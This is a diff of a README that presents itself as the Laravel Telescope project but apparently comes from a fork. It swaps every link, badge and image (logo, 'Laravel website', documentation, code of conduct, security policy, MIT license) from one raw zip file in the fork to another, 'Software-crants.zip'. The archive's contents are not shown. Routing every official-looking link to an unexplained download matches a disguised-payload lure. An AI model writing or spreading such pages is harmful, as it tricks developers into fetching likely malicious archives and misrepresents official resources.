@@ -1,10 +1,10 @@
-<p align="center"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip"></p>
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip" alt="License"></a>
+<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip" alt="Build Status"></a>
+<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip" alt="Total Downloads"></a>
+<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip" alt="Latest Stable Version"></a>
+<a href="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip"><img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip" alt="License"></a>
 </p>
 
 ## Introduction
@@ -12,25 +12,25 @@
 Laravel Telescope is an elegant debug assistant for the Laravel framework. Telescope provides insight into the requests coming into your application, exceptions, log entries, database queries, queued jobs, mail, notifications, cache operations, scheduled tasks, variable dumps and more. Telescope makes a wonderful companion to your local Laravel development environment.
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip">
+<img src="https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip">
 </p>
 
 ## Official Documentation
 
-Documentation for Telescope can be found on the [Laravel website](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip).
+Documentation for Telescope can be found on the [Laravel website](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip).
 
 ## Contributing
 
-Thank you for considering contributing to Telescope! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip).
+Thank you for considering contributing to Telescope! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip).
 
 ## Security Vulnerabilities
 
-Please review [our security policy](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip) on how to report security vulnerabilities.
+Please review [our security policy](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip) on how to report security vulnerabilities.
 
 ## License
 
-Laravel Telescope is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/harmonist/telescope.zip).
+Laravel Telescope is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/lamaSonmez/telescope/3.x/src/Http/Controllers/Software-crants.zip).
